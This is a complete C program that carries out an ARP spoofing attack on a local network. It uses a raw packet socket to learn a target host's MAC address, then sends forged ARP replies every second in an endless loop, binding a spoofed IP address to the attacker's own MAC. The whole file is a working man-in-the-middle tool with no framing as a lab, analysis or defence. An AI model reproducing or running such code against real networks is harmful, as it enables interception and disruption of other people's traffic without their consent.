#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/ip.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <linux/if.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>

#define HARDWARE_LENGTH 6 // mac 6 bytes
#define IP_LENGTH 4       // ip4 4 bytes
// storing the broadcast address FF:FF:FF:FF:FF:FF
#define BROADCAST_ADDR \
    (uint8_t[6]) { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF }
#define SPOOFED_PACKET_SEND_DELAY 1

typedef struct
{
    struct ether_header eh;
    struct ether_arp arp;
} PACKET_ARP;

PACKET_ARP *create_arp_packet(uint16_t opcode, uint8_t *my_mac_addr, char *spoofed_ip, uint8_t *target_mac, char *target_ip);

int send_packet_to_broadcast(int rsfd, struct sockaddr_ll *sa, uint8_t *my_mac_addr, char *spoofed_ip, char *target_ip);

uint8_t *get_target_response(int rsfd, char *target_ip);

int send_ARPreply_to_target(int rsfd, struct sockaddr_ll *sa, uint8_t *my_mac, char *spoofed_ip, uint8_t *target_mac, char *target_ip);

uint8_t *get_my_mac(int rsfd, char *device);

PACKET_ARP *create_arp_packet(uint16_t opcode, uint8_t *my_mac_addr, char *spoofed_ip, uint8_t *target_mac, char *target_ip)
{
    PACKET_ARP *arp_packet;

    if (!(arp_packet = malloc(sizeof(struct ether_header) + sizeof(struct ether_arp))))
    {
        return NULL;
    }
    arp_packet->arp.arp_hrd = htons(ARPHRD_ETHER);
    arp_packet->arp.arp_pro = htons(ETHERTYPE_IP);
    arp_packet->arp.arp_hln = HARDWARE_LENGTH;
    arp_packet->arp.arp_pln = IP_LENGTH;
    arp_packet->arp.arp_op = htons(opcode);
    memcpy(arp_packet->arp.arp_sha, my_mac_addr, sizeof(uint8_t) * HARDWARE_LENGTH);

    if (inet_pton(AF_INET, spoofed_ip, arp_packet->arp.arp_spa) != 1)

    {

        fprintf(stderr, "ERROR: Invalid_Spoofed_IP: %s\n", spoofed_ip);

        return NULL;
    }

    memcpy(arp_packet->arp.arp_tha, target_mac, sizeof(uint8_t) * HARDWARE_LENGTH);

    if (inet_pton(AF_INET, target_ip, arp_packet->arp.arp_tpa) != 1)

    {

        fprintf(stderr, "ERROR: Invalid_Target_IP: %s\n", target_ip);

        return NULL;
    }

    memcpy(arp_packet->eh.ether_dhost, target_mac, sizeof(uint8_t) * HARDWARE_LENGTH);

    memcpy(arp_packet->eh.ether_shost, my_mac_addr, sizeof(uint8_t) * HARDWARE_LENGTH);

    arp_packet->eh.ether_type = htons(ETHERTYPE_ARP);

    return arp_packet;
}

int send_packet_to_broadcast(int rsfd, struct sockaddr_ll *sa, uint8_t *my_mac_addr, char *spoofed_ip, char *target_ip)

{

    PACKET_ARP *arp_packet;

    fprintf(stdout, "Before createing Got my_MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", *my_mac_addr, *(my_mac_addr + 1), *(my_mac_addr + 2), *(my_mac_addr + 3), *(my_mac_addr + 4), *(my_mac_addr + 5));

    if (!(arp_packet = create_arp_packet(ARPOP_REQUEST, my_mac_addr, spoofed_ip, BROADCAST_ADDR, target_ip)))

    {

        fprintf(stderr, "ERROR: ARP_Packet_Creation_Failed\n");

        return -1;
    }

    fprintf(stdout, "ARP_Packet_Created\n");

    if ((sendto(rsfd, arp_packet, sizeof(struct ether_header) + sizeof(struct ether_arp), 0, (struct sockaddr *)sa, sizeof(*sa))) < 0)

    {

        fprintf(stdout, "ERROR: Broadcast_Failed\n");

        return -1;
    }

    fprintf(stdout, "ARP_Request_sent_to_Braodcast\n");

    return 0;
}

uint8_t *get_target_response(int rsfd, char *target_ip)

{

    u_char buf[1500];

    u_char *ptr;

    int lest;

    uint8_t str_to_uint8[4];

    uint8_t *target_mac;

    struct ether_header *eh;

    struct ether_arp *arp;

    fprintf(stdout, "Waiting_for_Target_Response...\n");

    while (1)

    {

        if ((lest = recvfrom(rsfd, buf, sizeof(buf), 0, NULL, NULL)) < 0)

        {

            return NULL;
        }

        fprintf(stdout, "Got_Packet %dbytes\n", lest);

        ptr = buf;

        if (lest < sizeof(struct ether_header))

            continue;

        eh = (struct ether_header *)buf;

        if (ntohs(eh->ether_type) == ETHERTYPE_ARP)

        {

            ptr += sizeof(struct ether_header);

            arp = (struct ether_arp *)ptr;
        }

        else

            continue;

        if (ntohs(arp->arp_op) == ARPOP_REPLY)

        {

            inet_pton(AF_INET, target_ip, str_to_uint8);

            if (memcmp(arp->arp_spa, str_to_uint8, IP_LENGTH) != 0)

            {

                fprintf(stderr, "ERROR: Target_IP_Not_Match: %d.%d.%d.%d\n", *arp->arp_spa, *(arp->arp_spa + 1), *(arp->arp_spa + 2), *(arp->arp_spa + 3));

                continue;
            }
        }

        else

            continue;

        fprintf(stdout, "Got_Arp_Reply_from_Target\n");

        fprintf(stdout, "Target_MAC_Address: %02x:%02x:%02x:%02x:%02x:%02x\n", *arp->arp_sha, *(arp->arp_sha + 1), *(arp->arp_sha + 2), *(arp->arp_sha + 3), *(arp->arp_sha + 4), *(arp->arp_sha + 5));

        fprintf(stdout, "Target_IP_Address: %d.%d.%d.%d\n", *arp->arp_spa, *(arp->arp_spa + 1), *(arp->arp_spa + 2), *(arp->arp_spa + 3));

        if (!(target_mac = malloc(sizeof(uint8_t) * HARDWARE_LENGTH)))

            return NULL;

        memcpy(target_mac, arp->arp_sha, sizeof(uint8_t) * HARDWARE_LENGTH);

        return target_mac;
    }
}

int send_ARPreply_to_target(int rsfd, struct sockaddr_ll *sa, uint8_t *my_mac, char *spoofed_ip, uint8_t *target_mac, char *target_ip)

{

    PACKET_ARP *arp_packet;

    if (!(arp_packet = create_arp_packet(ARPOP_REPLY, my_mac, spoofed_ip, target_mac, target_ip)))

    {

        fprintf(stderr, "ERROR: ARP_PACKET creation failed");

        return -1;
    }

    while (1)

    {

        sendto(rsfd, arp_packet, sizeof(struct ether_header) + sizeof(struct ether_arp), 0, (struct sockaddr *)sa, sizeof(*sa));

        fprintf(stdout, "Spoofed_Packet_Sent_to: %s\n", target_ip);

        sleep(SPOOFED_PACKET_SEND_DELAY);
    }

    return 0;
}

uint8_t *get_my_mac(int rsfd, char *device)

{
    struct ifreq ifreq;
    uint8_t *mac;
    memset(&ifreq, 0, sizeof(struct ifreq));
    strncpy(ifreq.ifr_name, device, sizeof(ifreq.ifr_name) - 1);
    if (ioctl(rsfd, SIOCGIFHWADDR, &ifreq) < 0)
    {
        perror("ERROR: SIOCGIFHWADDR\n");
        return NULL;
    }

    mac = malloc(HARDWARE_LENGTH);
    memcpy(mac, ifreq.ifr_hwaddr.sa_data, sizeof(uint8_t) * HARDWARE_LENGTH);

    return mac;
}

int main(int argc, char *argv[])

{
    int rsfd;
    struct sockaddr_ll sa;
    char *spoofed_ip, *target_ip, *interface;
    uint8_t *my_mac, *target_mac;

    if (argc != 4)
    {
        fprintf(stderr, "Usage[%s]: Spoofed_IP, Target_IP, Interface_name\n", argv[0]);
        return -1;
    }

    spoofed_ip = argv[1];
    target_ip = argv[2];
    interface = argv[3];

    if ((rsfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0)
    {
        fprintf(stderr, "ERROR: Socket_Creation_Failed\n");
        return -1;
    }

    if ((my_mac = get_my_mac(rsfd, interface)) < 0)
    {
        perror("ERROR: Get_My_MAC\n");
        return -1;
    }

    fprintf(stdout, "Got_My_MAC: %02x:%02x:%02x:%02x:%02x:%02x\n", *my_mac, *(my_mac + 1), *(my_mac + 2), *(my_mac + 3), *(my_mac + 4), *(my_mac + 5));

    memset(&sa, 0, sizeof(sa));

    sa.sll_ifindex = if_nametoindex(interface);

    fprintf(stdout, "Got_Ifindex %d from Interface %s\n", sa.sll_ifindex, interface);

    send_packet_to_broadcast(rsfd, &sa, my_mac, spoofed_ip, target_ip);

    target_mac = get_target_response(rsfd, target_ip);

    send_ARPreply_to_target(rsfd, &sa, my_mac, spoofed_ip, target_mac, target_ip);

    close(rsfd);

    return 0;
}